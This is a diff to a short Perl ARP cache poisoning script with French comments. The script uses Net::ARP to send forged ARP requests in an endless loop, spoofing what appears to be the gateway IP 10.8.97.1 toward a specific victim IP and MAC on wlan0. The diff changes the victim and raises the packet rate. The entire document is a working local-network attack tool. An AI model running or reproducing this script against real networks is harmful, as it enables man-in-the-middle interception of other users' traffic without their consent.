@@ -1,7 +1,9 @@
 #!/usr/bin/perl -w
 use Net::ARP;
 use strict;
+use Time::HiRes;
 $| = 1;
+my $pktcount = 0;
 for (;;)
 {
 	# Methode "reply", pas très efficase sur certains systèmes, ils attendent une reponse ARP uniquement après une demande.
@@ -16,10 +18,11 @@ for (;;)
 	# Mais visiblement très efficace pour faire du ARP Cache Poisoning. 
 	Net::ARP::send_packet('wlan0',                 # Device
             '10.8.97.1',          # Source IP
-            '10.8.108.30',          # Destination IP
+            '10.8.108.55',          # Destination IP
             '94:db:c9:47:dc:6d',  # Source MAC
-            '12:84:0f:a1:6f:9a',  # Destinaton MAC
+            '20:10:7a:f9:8d:d6',  # Destinaton MAC
             'request');             # ARP operation
-	sleep 1;
-	print("Packet ARP Envoyé !\n");
+	Time::HiRes::sleep (0.2);
+	$pktcount++;
+	print("Packet ARP Envoyé : # $pktcount\n");
 }
